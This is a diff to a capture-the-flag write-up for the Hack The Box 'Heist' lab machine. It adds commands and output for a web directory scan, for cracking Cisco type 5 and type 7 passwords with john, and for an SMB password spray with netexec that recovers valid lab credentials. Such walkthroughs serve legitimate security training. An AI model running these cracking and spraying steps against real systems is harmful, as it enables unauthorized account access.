@@ -48,7 +48,8 @@ http://10.10.10.149 [302 Found] Cookies[PHPSESSID], Country[RESERVED][ZZ], HTTPS
 ```
 
 ```bash
-┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist] feroxbuster --url http://$heist --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
+┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist] 
+└─$ feroxbuster --url http://$heist --depth 3 --wordlist /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -C 404 -x php,sh,txt,cgi,html,js,css,py,zip,aspx,pdf,docx,doc,md,log,htm,asp,do
 ```
 
 http://10.10.10.149/login.php
@@ -83,6 +84,45 @@ username rout3r password 7 0242114B0E143F015F5D1E161713
 username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
 ```
 
+Type 5 Password Decrypt:
+[Type 5 Password Decrypt](https://www.ifm.net.nz/cookbooks/cisco-ios-enable-secret-password-cracker.html)
+
+```bash
+
+┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
+└─$ vim hashes.ciscoASAMD5
+$1$pdQG$o8nrSzsGXeaduXrjlvKc91
+
+┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.ciscoASAMD5 
+...
+$1$pdQG$o8nrSzsGXeaduXrjlvKc91:stealth1agent
+```
+
+Type 7 Password Decrypt
+[Type 7 Password Decrypt](https://www.firewall.cx/cisco/cisco-routers/cisco-type7-password-crack.html)
+
+```text
+0242114B0E143F015F5D1E161713:$uperP@ssword
+02375012182C1A1D751618034F36415408:Q4)sJu\Y8qz*A3?d
+```
+
+```text
+┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
+└─$ cat users.txt
+hazard
+rout3r
+admin
+```
+
+
+```text
+┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
+└─$ cat passwords.txt 
+stealth1agent
+Q4)sJu\Y8qz*A3?d
+$uperP@ssword 
+```
 
 #### 445/tcp - SMB
 ```bash
@@ -101,6 +141,17 @@ Domain Information via SMB session for 10.10.10.149
     DNS domain: SupportDesk
     FQDN: SupportDesk
     Derived membership: workgroup member 
+```
+
+```bash
+┌──(haunter㉿kali)-[~/working/OpposingForce/haunter-actual.github.io/_posts/ctf/htb/easy/heist]
+└─$ nxc smb $heist -u users.txt -p passwords.txt --continue-on-success
+...
+SMB         10.10.10.149    445    SUPPORTDESK      [+] SupportDesk\hazard:stealth1agent   
+```
+
+```text
+hazard:stealth1agent
 ```
 
 
